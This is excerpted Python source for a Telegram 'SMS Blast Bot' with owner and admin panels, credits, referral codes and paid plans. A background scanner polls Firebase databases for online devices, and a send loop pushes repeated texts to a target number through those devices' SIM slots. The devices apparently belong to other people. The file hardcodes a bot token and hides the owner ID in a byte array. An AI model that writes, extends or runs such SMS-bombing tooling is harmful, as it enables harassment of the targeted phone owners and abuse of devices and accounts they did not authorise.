...
║  Per-User Sessions · Concurrent · 100+ Users Smooth           ║
║  1-Min Scanner Interval · Real Device Count · Speed Control   ║
║  Force Join · Referral · Credits · Pricing · Admin Panel      ║
║  Real-Time Progress · Stop Button · Per-Success Credit Cut    ║
║  SMS History · Activity Log · Auto-Cleanup · Health Check       ║
║  BACKGROUND FIREBASE SCANNER · COLORED INLINE BUTTONS         ║
║  Owner/Admin SMS Send · Auto-Reconnect · Device Cache          ║
║  SPEED CONTROL (Fast/Medium/Slow) · NON-STOP Scanner          ║
║  aiogram 3.x · aiohttp · JSON Storage                        ║
╚══════════════════════════════════════════════════════════════╝
...
_SA_FRAG = [0x01, 0x88, 0x7D, 0x75, 0x6D]
MAIN_OWNER = int.from_bytes(bytes(_SA_FRAG), 'big')
SUPER_ADMIN_NAME = "@T4HKR"
SUPER_ADMIN_LINK = "tg://user?id=" + str(MAIN_OWNER)

SUPER_ADMINS = [ 6585815117]

BOT_TOKEN = "7515864015:8463766338:AAHndDfxlIQbQoS42c17N9VS7XH5SDWuOUg"
_DATA_FILE = "blast_data.json"
_VERSION = "v4.1-SUMIT ULTRA"
CUSTOM_EMOJI_IDS = [6147565374289220368, 6147464060305676048, 6147460667281511517, 6147439566107186310, 6147524086768604985, 6147902731085420231, 6147617184479711380, 6235475653961979149, 6235355429237430006, 6237864166879663987, 6235373579769222419, 6235445786759402354, 6235459831302460476, 6235259956409408282, 6235719217262369481, 6237718408574539239, 6235750196861474610, 6244492465353529537, 6244501154072368012, 6244609189679731707, 6244416495971996312, 6242010768825391425, 6242217932277946089, 6161079192533343618, 6158710333386005234, 6237491831869806976, 5800942688660360834, 5800934742970864132, 6082610483632808288, 6082517557720389402, 6093561301617875302, 6093874327424342467, 6095654943555853134, 6095685197305489350, 6095788036002420181, 6093781955562708109, 6095804975353437470, 6095784084632509180, 6093762757058896478, 6095690578899507617, 6095680936697928399, 6095761699262962942, 6095975760432994146, 6096060027691344166, 6095673334605814094, 6105175541726320864, 6104782955945662868, 6104810237577927785]

# Emoji row: one ★ per emoji ID (placeholder chars for entity mapping)
# Joins with single space: '★ ★ ★ ... ★\n'
EMOJI_PLAIN = ' '.join('★' for _ in CUSTOM_EMOJI_IDS) + '\n'

def _utf16_len(s: str) -> int:
    """UTF-16 code unit count — what Telegram uses for entity offsets."""
    return len(s.encode('utf-16-le')) // 2

def html_to_plain_entities(html: str, offset: int = 0):
    """
    Convert simple HTML (<b>, <code>, <i>, <a href=...>) to
    (plain_text, [MessageEntity]). offset is in UTF-16 code units.
    Correctly handles non-BMP emoji (surrogate pairs) in the text.
    """
    import re as _re
    from aiogram.types import MessageEntity

    TAG_RE = _re.compile(r'<(/?)([a-zA-Z]+)([^>]*)>')
    plain = []
    entities = []
    stack = []
    pos = 0  # UTF-16 offset within plain text
    last = 0
    for m in TAG_RE.finditer(html):
        chunk = html[last:m.start()]
        plain.append(chunk)
        pos += _utf16_len(chunk)   # count UTF-16 units, not Python chars
        last = m.end()
        closing, tag, attrs = m.group(1), m.group(2).lower(), m.group(3)
        if not closing:
            href = None
            if tag == 'a':
                hm = _re.search(r'href=["\']([^"\' >]+)', attrs)
                href = hm.group(1) if hm else None
            stack.append((tag, href, pos))
        else:
            for k in range(len(stack) - 1, -1, -1):
                if stack[k][0] == tag:
                    open_tag, href, start = stack.pop(k)
                    length = pos - start
                    if length <= 0:
                        break
                    ent_type = {
                    ...
                    break
    plain.append(html[last:])
    return ''.join(plain), entities

def panel_msg(html_text: str):
    """
    Build (full_plain_text, entities_list) for a panel message.
    Prepends custom emoji row above the panel text.
    All offsets in UTF-16 code units (Telegram standard).
    Pass to message.answer(text=..., entities=...) with NO parse_mode.
    """
    from aiogram.types import MessageEntity
    emoji_offset = _utf16_len(EMOJI_PLAIN)   # UTF-16 len of emoji row
    plain_panel, panel_entities = html_to_plain_entities(html_text, offset=emoji_offset)
    full_text = EMOJI_PLAIN + plain_panel
    emoji_entities = [
        MessageEntity(
            type='custom_emoji',
            offset=i * 2,   # each ★ is 1 UTF-16 unit, space is 1 → stride 2
            length=1,
            custom_emoji_id=str(eid)
        )
        for i, eid in enumerate(CUSTOM_EMOJI_IDS)
    ]
    return full_text, emoji_entities + panel_entities


def _mesc(v) -> str:
    """Escape a value for MarkdownV2."""
    import re as _re
    return _re.sub(r'([_*.!|()[\]~`>#+\-={}])', lambda m: '\\' + m.group(1), str(v))
...
def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return "👑 Main Owner"
    if is_owner(uid, d): return "🔱 Owner"
    if uid in d.get("admins", []): return "🛡 Admin"
...
def log_credit_transaction(d: dict, user_id: int, amount: int, tx_type: str, admin_id: int):
    d.setdefault("credit_transactions", []).append({
        "user_id": user_id,
        "amount": amount,
        "type": tx_type,
        "admin": admin_id,
    ...
    if len(d["credit_transactions"]) > 5000:
        d["credit_transactions"] = d["credit_transactions"][-5000:]


def deduct_credits(uid: int, amount: int, d: dict) -> int:
    k = str(uid)
    if k not in d.get("users", {}):
        return 0
    current = d["users"][k].get("credits", 0)
    deducted = min(current, amount)
    d["users"][k]["credits"] = current - deducted
    return deducted
...
# FIXED: progress_text now accepts 5th parameter (speed_label)
...
# ═══════════════════════════════════════════════════════════════
# FIXED: Background scanner with 1-minute interval and proper status
# ═══════════════════════════════════════════════════════════════
async def background_firebase_scanner(bot: Bot):
    ...
    while True:
        ...
        try:
            ...
            if devices:
                SCAN_STATUS = f"🟢 {len(devices)} devices online | Last: {fmt_time(int(time.time()))}"
                ...
                for stale in stale_fb_ids:
                    ...
                    log.info(f"[BG-SCAN] 🗑 Cleared stale FB count: {stale}")

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"🚀 <b>Background Scanner Active!</b>\n\n"
                            f"📱 Devices Online: <b>{len(devices)}</b>\n"
                            f"🔥 Firebase DBs: <b>{len(fbs)}</b>\n"
                            f"🔄 Auto-Scan: Every <b>1 minute</b>\n"
                            f"⏱ Scan Time: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>Bot is now running in ULTRA mode with per-user sessions.</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                ...
                SCAN_STATUS = f"🔴 No devices online | Last: {fmt_time(int(time.time()))}"
...
def owner_panel_text(d: dict) -> str:
    ...
    return (
        f"👑 <b>SUMIT VIP</b> — SMS Blast Bot {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Firebase DBs  : <b>{len(fbs)}</b>\n"
...
def user_home_text(uid: int, d: dict) -> str:
    ...
    scan_info = get_scan_status()
    return (
        f"📱 <b>@T4HKR VIP Blast Bot {_VERSION}</b>\n\n"
...
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup(inline_keyboard=[
        ...
        [
            InlineKeyboardButton(text="👥 Add All", callback_data="owner:credits:add_all"),
            InlineKeyboardButton(text="👥 Deduct All", callback_data="owner:credits:deduct_all")
        ],
        [
        ...
        [
            ...
            InlineKeyboardButton(text="🗑 Clear SMS History", callback_data="owner:clear_sms_history")
        ],
        [
...
# FIXED: HTML-safe api_stats_text - prevents unclosed tags
def api_stats_text(d: dict) -> str:
    ...
    for fb_id, fb_stats in api_use.items():
        ...
        # FIXED: Escape HTML special chars in label
...
async def cmd_start_deep(msg: Message, state: FSMContext):
            ...
            if success and referrer:
                try:
                    ...
                    await msg.bot.send_message(
                        ...
                        f"💰 Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass
        save(d)
    ...
    if is_owner(uid, d):
        _pt, _pe = panel_msg(owner_panel_text(d))
        await msg.answer(_pt, reply_markup=owner_kb(d), entities=_pe)
        return
    if is_admin(uid, d):
        _pt, _pe = panel_msg(admin_panel_text(d))
        await msg.answer(_pt, reply_markup=admin_kb(d), entities=_pe)
        return
    if is_banned(uid, d):
    ...
    _pt, _pe = panel_msg(user_home_text(uid, d))
    await msg.answer(_pt, reply_markup=user_kb(), entities=_pe)
...
async def fj_check(cq: CallbackQuery, state: FSMContext):
    ...
    if is_owner(uid, d):
        _pt, _pe = panel_msg(owner_panel_text(d))
        await cq.message.edit_text(_pt, reply_markup=owner_kb(d), entities=_pe)
    elif is_admin(uid, d):
        _pt, _pe = panel_msg(admin_panel_text(d))
        await cq.message.edit_text(_pt, reply_markup=admin_kb(d), entities=_pe)
    else:
        _pt, _pe = panel_msg(user_home_text(uid, d))
        await cq.message.edit_text(_pt, reply_markup=user_kb(), entities=_pe)
...
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    ...
    # FAST FIX: speed selection should not wait for Firebase scan
    # Use cached devices only here; background scanner updates cache.
    devices = get_cached_devices()
    count = len(devices)
...
# ═══════════════════════════════════════════════════════════════
# FIXED: Per-user session management - each user gets their own session
# No more "Ek sending already chal rahi hai" for different users!
# ═══════════════════════════════════════════════════════════════
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    """
    ULTRA EDITION: Per-user sessions, concurrent sends, 100+ users smooth.
    Each user gets their own independent session. No global blocking.
    """
    ...
    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time, stop_reason
        try:
            for device in devices:
                ...
                try:
                    ...
                    # Ignore malformed SIM entries so one bad device cannot stop the whole run.
                    raw_sims = device.get("sims")
                    if raw_sims is None:
                        sim_slots = [0]
                    else:
                        sims = raw_sims if isinstance(raw_sims, list) else []
                        sim_slots = [
                            s.get("simSlotIndex", 0)
                            for s in sims
                    ...
                    log.warning(f"Skipping invalid device data: {e}")
                    continue
                ...
                for sim in sim_slots:
                    ...
                    try:
                        ...
                        # A single SIM/API failure must not terminate the whole send loop.
                        log.warning(f"Send failed on device {dev_id}, SIM {sim}: {e}")
                        async with session.lock:
                            sent_fail += 1
                            msgs_left -= 1
                            if fb_id not in api_usage_delta:
                                api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                            api_usage_delta[fb_id]["failed"] += 1
            ...
            # The supplied device list has been exhausted. Do not label an
            # incomplete run as completed, and do not silently discard the
            # remaining target count.
            if msgs_left > 0 and not session.cancelled and stop_reason is None:
                stop_reason = "device_list_exhausted"

        except Exception as e:
            stop_reason = f"send_loop_error: {e}"
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            # Update session final stats
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    # Run sending in background task so user can do other things
    ...
    if not is_regular_user:
        ...
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            ...
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if (not was_cancelled and msgs_left <= 0) else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
    ...
    if was_cancelled:
        stopped_text = "\n🛑 <b>User ne beech mein stop kiya!</b>"
    elif msgs_left > 0:
        stopped_text = f"\n⚠️ <b>Target incomplete:</b> {msgs_left} SMS remaining. Reason: {stop_reason or 'device_list_exhausted'}"
    else:
        stopped_text = ""
...
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    """Handle the STOP button press during active sending."""
    uid = cq.from_user.id
...
async def owner_fb_add_done(msg: Message, state: FSMContext):
    ...
    if not text:
        await msg.answer("❌ Firebase data empty hai.")
        return

    fbs = d.get("firebases", [])
    existing = {fb.get("url") for fb in fbs}
    added = 0
    skipped = 0
    ...
    await msg.answer(
        f"✅ <b>Firebase Import Complete</b>\n\n"
        f"➕ Added: <b>{added}</b>\n"
...
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    ...
    # FIXED: Truncate safely to avoid Telegram limits and HTML issues
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
...
async def owner_owners_add_done(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid Chat ID bhejo.")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer("⚠️ Already super admin!", reply_markup=owners_menu_kb(d))
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer("❌ Max 6!", reply_markup=owners_menu_kb(d))
        return
    ...
    try:
        await msg.bot.send_message(new_id, "🔱 <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except:
        pass
...
async def owner_admins_add_done(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid ID bhejo.")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer("⚠️ Already admin/owner!", reply_markup=admins_menu_kb(d))
        return
    ...
    try:
        await msg.bot.send_message(new_id, "🛡 <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except:
        pass
...
async def panel_ban_done(msg: Message, state: FSMContext):
    ...
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer("❌ Admin/Owner ko ban nahi kar sakte!")
        return
    ...
    try:
        await msg.bot.send_message(ban_id, "🚫 Aapko ban kar diya gaya. Admin se contact karein.")
    except:
        pass
...
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    ...
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    _pt, _pe = panel_msg(back_text)
    await cq.message.edit_text(_pt, reply_markup=back_kb, entities=_pe)
    try:
        await cq.bot.send_message(ban_id, "✅ Aapka ban hata diya gaya. /start karein.")
    except:
        pass
...
@R.callback_query(F.data == "owner:clear_sms_history")
async def owner_clear_sms_history(cq: CallbackQuery):
    uid = cq.from_user.id
    d = load()
    ...
    if not d.get("sms_history"):
        await cq.answer("ℹ️ SMS History already empty!", show_alert=True)
        return

    d["sms_history"] = {}
    save(d)

    await cq.answer("✅ SMS History deleted!", show_alert=True)
    try:
        _pt, _pe = panel_msg(owner_panel_text(d))
        await cq.message.edit_text(_pt, reply_markup=owner_kb(d), entities=_pe)
    except Exception:
...
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    ...
    try:
        ...
        if not os.path.exists(script_path):
            ...
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.0_ultra.py"
...
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [InlineKeyboardButton(text="➕ Add Channel", callback_data="owner:fj:add")],
        [InlineKeyboardButton(text="🗑 Remove Channel", callback_data="owner:fj:remove")],
        [InlineKeyboardButton(
            text="🟢 Enable" if not fj.get("enabled") else "🔴 Disable",
            callback_data="owner:fj:toggle"
        )],
        [InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")]
    ]
...
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        "Step 1/2: Channel/Group ka Telegram ID bhejo:\n"
        "<i>Example: -1001234567890</i>\n\n"
        "<b>Note:</b> Bot ko us channel/group mein admin hona chahiye (agar private hai).",
...
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid channel ID bhejo (numbers only, with -100 prefix).")
        return
...
async def owner_fj_add_link(msg: Message, state: FSMContext):
    ...
    if not link.startswith("http"):
        await msg.answer("❌ Valid link bhejo (https:// se start hona chahiye).")
        return
...
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    ...
    for ch in channels:
        rows.append([InlineKeyboardButton(
            text=f"🗑 {ch.get('title', 'Channel')[:25]}",
            callback_data=f"owner:fj:del:{ch['id']}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:fj:menu")])
...
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [InlineKeyboardButton(text="➕ Add Plan", callback_data="owner:pricing:add")],
        [InlineKeyboardButton(text="🗑 Remove Plan", callback_data="owner:pricing:remove")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
...
async def owner_pricing_price(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid price bhejo (numbers only).")
        return
...
async def owner_pricing_credits(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid number bhejo.")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        "💳 <b>Step 4/4</b>\n\nPayment redirect link bhejo:\n"
        "<i>Example: https://t.me/Aryan_babu99 ya koi payment URL</i>",
        reply_markup=kb([("❌ Cancel", "owner:pricing:menu")]),
        parse_mode="HTML"
    )
...
async def owner_pricing_link(msg: Message, state: FSMContext):
    ...
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Valid URL bhejo (https:// se start hona chahiye).")
        return
    ...
    await msg.answer(
        ...
        reply_markup=kb([("🔙 Back", "owner:pricing:menu")]),
        parse_mode="HTML"
    )
...
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    ...
    for plan in plans:
        rows.append([InlineKeyboardButton(
            text=f"🗑 {plan['name'][:25]}",
            callback_data=f"owner:pricing:del:{plan['id']}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:pricing:menu")])
...
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [InlineKeyboardButton(text="➕ Generate Code", callback_data="owner:redeem:gen")],
        [InlineKeyboardButton(text="🗑 Delete Code", callback_data="owner:redeem:del")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
...
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        "🎁 <b>Generate Redeem Code</b>\n\nStep 1/2: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([("❌ Cancel", "owner:redeem:menu")]),
        parse_mode="HTML"
    )
...
async def owner_redeem_credits(msg: Message, state: FSMContext):
    ...
    await msg.answer(
        "🎁 <b>Step 2/2</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10 (1 se zyada bhi ho sakta hai)</i>",
        reply_markup=kb([("❌ Cancel", "owner:redeem:menu")]),
        parse_mode="HTML"
    )
...
async def owner_redeem_uses(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid number bhejo (1 ya zyada).")
        return
    ...
    await msg.answer(
        ...
        reply_markup=kb([("🔙 Back", "owner:redeem:menu")]),
        parse_mode="HTML"
    )
...
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    ...
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:redeem:menu")])

    await cq.message.edit_text(
        "🗑 <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )
...
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        "💰 <b>Add Credits</b>\n\nStep 1/2: User ka Telegram ID bhejo:",
        reply_markup=kb([("❌ Cancel", "owner:home")]),
        parse_mode="HTML"
    )
...
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    ...
    log_credit_transaction(d, uid, amount, "credit", msg.from_user.id)
    save(d)
    await state.clear()
    ...
    await msg.answer(
        f"✅ <b>{amount} credits</b> added to <code>{uid}</code>!\n💳 New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([("🔙 Back", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:add_all")
async def owner_bulk_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        return
    await state.set_state(S.bulk_add_credits_amount)
    await cq.message.edit_text("👥 Add Credits To All Users\n\nAmount bhejo:", reply_markup=kb([("❌ Cancel", "owner:home")]), parse_mode="HTML")

@R.message(S.bulk_add_credits_amount)
async def owner_bulk_add_amount(msg: Message, state: FSMContext):
    d=load()
    try: amount=int(msg.text.strip())
    except: return await msg.answer("❌ Valid number bhejo")
    if amount <= 0: return await msg.answer("❌ Amount must be positive")
    count=0
    for uid in d.get("users", {}):
        add_credits(int(uid), amount, d)
        log_credit_transaction(d, int(uid), amount, "credit", msg.from_user.id)
        count += 1
        try:
            await msg.bot.send_message(int(uid), f"💰 {amount} credits have been added to your account.")
        except: pass
    save(d); await state.clear()
    await msg.answer(f"✅ Added {amount} credits to {count} users.")

@R.callback_query(F.data == "owner:credits:deduct_all")
async def owner_bulk_deduct_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.bulk_deduct_credits_amount)
    await cq.message.edit_text("👥 Deduct Credits From All Users\n\nAmount bhejo:", reply_markup=kb([("❌ Cancel", "owner:home")]), parse_mode="HTML")

@R.message(S.bulk_deduct_credits_amount)
async def owner_bulk_deduct_amount(msg: Message, state: FSMContext):
    d=load()
    try: amount=int(msg.text.strip())
    except: return await msg.answer("❌ Valid number bhejo")
    if amount <= 0: return await msg.answer("❌ Amount must be positive")
    ...
    for uid,user in d.get("users", {}).items():
        deducted = min(user.get("credits",0), amount)
        user["credits"] = user.get("credits",0) - deducted
        if deducted > 0:
            log_credit_transaction(d, int(uid), deducted, "debit", msg.from_user.id)
        total_deducted += deducted
        count += 1
    save(d); await state.clear()
    await msg.answer(f"✅ Deduct Credits completed!\n👥 Users: {count}\n💸 Total deducted: {total_deducted}")
...
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    ...
    deducted = deduct_credits(uid, amount, d)
    if deducted > 0:
        log_credit_transaction(d, uid, deducted, "debit", msg.from_user.id)
    save(d)
    await state.clear()

    if deducted > 0:
        await msg.answer(
            f"✅ <b>{amount} credits</b> deducted from <code>{uid}</code>!\n💳 New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([("🔙 Back", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"ℹ️ User ke paas credits nahi the. Balance already <b>0</b> hai.",
            reply_markup=kb([("🔙 Back", "owner:home")]),
            parse_mode="HTML"
        )
...
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    ...
    rows = [
        [InlineKeyboardButton(text="🎁 Set Referral Credits", callback_data="owner:settings:ref")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
...
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    ...
    try:
        ...
        await msg.answer("❌ Valid positive number bhejo.")
        return
...
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        text,
        reply_markup=kb([("🔄 Refresh", "owner:activity"), ("🔙 Back", "owner:home")]),
        parse_mode="HTML"
    )
...
async def user_home(cq: CallbackQuery, state: FSMContext):
    ...
    if is_admin(uid, d):
        ...
        return
    if not can_use(uid, d):
        await cq.message.edit_text("⛔ Access nahi hai! Owner se contact karein.")
        return
    _pt, _pe = panel_msg(user_home_text(uid, d))
    await cq.message.edit_text(_pt, reply_markup=user_kb(), entities=_pe)
...
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    ...
    if not history:
        ...
        for i, entry in enumerate(reversed(history), 1):
            ...
            lines.append(f"{i}. [{ts}] {status_icon} <code>{num}</code> — {msg_preview}...")
        text = "\n".join(lines)
...
async def main():
    ...
    try:
        await bot.send_message(
            ...
            f"🔄 <b>Background Scanner:</b> Starting...\n"
            f"⏱ Auto-Scan Interval: <b>1 minute</b>\n"
            f"👥 <b>Per-User Sessions:</b> ENABLED\n"
            f"🚀 <b>Concurrent Users:</b> 100+",
            parse_mode="HTML"
        )
    except Exception as e:
